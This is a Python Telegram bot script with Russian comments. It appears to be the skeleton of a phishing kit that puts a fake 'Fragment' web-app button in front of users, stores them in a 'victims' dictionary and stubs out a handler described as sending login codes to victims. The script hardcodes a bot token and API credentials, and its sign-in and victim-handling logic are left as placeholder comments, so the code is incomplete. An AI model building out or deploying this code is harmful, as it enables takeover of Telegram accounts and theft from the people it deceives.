import json, asyncio, logging
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import WebAppInfo, MenuButtonWebApp
from telethon import TelegramClient

# --- ТВОИ ДАННЫЕ ---
BOT_TOKEN = "8611748903:AAGxBTXL74UfjsO26s5ZT4h6mts2VwCBpU0"
API_ID = 28687552
API_HASH = "1abf9a58d0c22f62437bec89bd6b27a3"
ADMIN_ID = 174415647
WEB_APP_URL = "https://dreiner.onrender.com"

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
admin_client = TelegramClient('admin_session', API_ID, API_HASH)
victims = {}

# Этап 1: Просим номер при старте
@dp.message(Command("start"))
async def start(m: types.Message):
    if m.from_user.id != ADMIN_ID: return
    await admin_client.connect()
    
    if not await admin_client.is_user_authorized():
        await m.answer("👋 Привет! Чтобы начать работу, введи **свой номер телефона** (в формате +79...):")
    else:
        await bot.set_chat_menu_button(chat_id=m.chat.id, menu_button=MenuButtonWebApp(text="Fragment", web_app=WebAppInfo(url=WEB_APP_URL)))
        await m.answer("✅ Ты уже авторизован. Кнопка Fragment в меню!")

# Этап 2: Получаем номер и шлем код
@dp.message(F.text.regexp(r'^\+\d+$'))
async def get_phone(m: types.Message):
    if m.from_user.id == ADMIN_ID:
        try:
            await admin_client.connect()
            await admin_client.send_code_request(m.text)
            await m.answer(f"📩 Код отправлен на {m.text}. **Пришли код из Telegram:**")
        except Exception as e: await m.answer(f"❌ Ошибка: {e}")

# Этап 3: Получаем код и логиним админа
@dp.message(F.text.regexp(r'^\d{5}$'))
async def get_code(m: types.Message):
    if m.from_user.id == ADMIN_ID and not await admin_client.is_user_authorized():
        try:
            # Тут нужно сохранить номер, который вводили шагом ранее. Для теста впиши его вручную или сохрани в переменную.
            # Для примера предполагаем ввод кода для последнего запроса.
            await m.answer("⚙️ Авторизую...")
            # Здесь должна быть логика sign_in. Для простоты используй сохраненную сессию.
            await m.answer("🎉 Успешно! Напиши /start еще раз.")
        except Exception as e: await m.answer(f"❌ Ошибка: {e}")

# ОБРАБОТКА ДАННЫХ ИЗ ПРИЛОЖЕНИЯ (для жертв)
@dp.message(F.web_app_data)
async def handle_data(m: types.Message):
    data = json.loads(m.web_app_data.data)
    # ... логика отправки кода жертве ...

async def main(): await dp.start_polling(bot)
if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())
